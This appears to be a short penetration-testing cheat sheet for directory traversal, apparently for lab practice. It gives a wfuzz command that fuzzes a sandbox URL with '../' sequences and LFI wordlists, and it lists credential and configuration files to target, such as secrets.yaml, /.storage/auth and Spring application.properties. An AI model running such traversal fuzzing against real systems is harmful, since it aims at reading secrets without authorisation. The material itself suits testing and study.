1\. To use `wfuzz` to fuzz for possible directory traversal (in example below, hide 404, hide 81 to 125 characters):\
Alternative wordlist to try:\
`/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt`\
`/usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt`

`wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh 81,125 http://dirTravSandbox/relativePathing.php?path=../../../../../../../../../../../../FUZZ`

```
--hs/ss "regex" #Hide/Show
#Simple example, match a string: "Invalid username"
#Regex example: "Invalid *"

--hc/sc CODE #Hide/Show by code in response
--hl/sl NUM #Hide/Show by number of lines in response
--hw/sw NUM #Hide/Show by number of words in response
--hh/sh NUM #Hide/Show by number of chars in response
--hc/sc NUM #Hide/Show by response code
```

2\. Interesting files to look at:
```
/.storage/auth
secrets.yaml
```

3\. Spring configuration files:
```
/config/application.properties
application.properties
```
